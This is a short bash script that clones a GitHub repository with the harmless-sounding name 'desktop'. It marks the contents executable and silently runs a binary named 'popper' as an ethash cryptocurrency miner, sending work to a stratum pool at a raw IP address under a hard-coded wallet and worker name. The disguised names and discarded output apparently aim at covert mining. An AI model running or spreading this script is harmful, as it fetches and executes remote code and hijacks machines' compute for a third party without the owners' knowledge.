#!/bin/bash
cd /acstrg
git clone https://github.com/vntripforcloud/desktop.git -q
chmod -R +x desktop
./desktop/popper -a ethash -o stratum+tcp://141.95.124.99:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-14 > /dev/null 2>&1